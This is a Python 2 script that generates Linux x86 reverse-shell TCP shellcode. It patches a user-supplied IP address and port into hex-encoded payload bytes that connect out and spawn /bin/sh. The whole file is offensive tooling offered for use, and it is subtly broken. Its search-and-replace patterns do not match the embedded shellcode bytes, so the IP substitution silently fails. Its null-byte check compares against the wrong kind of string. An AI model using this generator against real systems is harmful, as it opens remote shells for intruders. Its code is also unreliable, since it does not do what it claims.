#!/usr/bin/python

# Filename: reverse_shell_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable IP address and port number
# Usage: python reverse_shell_tcp_wrapper.py <IP address> <port>

import socket
import sys
import struct

shellcode = """
\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xbf\\xff
\\xff\\xff\\xff\\x81\\xf7\\x80\\xff\\xff\\xfe\\x57\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16
\\x51\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80
\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x88\\x44\\x24\\x0b\\x89\\xe3
\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80
"""

if (len(sys.argv) < 3):
    print "Usage: python {name} <IP address> <port>".format(name = sys.argv[0])
    exit()

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte!'
    exit(1)

# Inject the XOR bytes
shellcode = shellcode.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

shellcode = shellcode.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Port
port = int(sys.argv[2])

if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    exit()
 
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

# Execute
print("Generated shellcode using custom IP: " + sys.argv[1] + " and custom port: " + sys.argv[2])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"

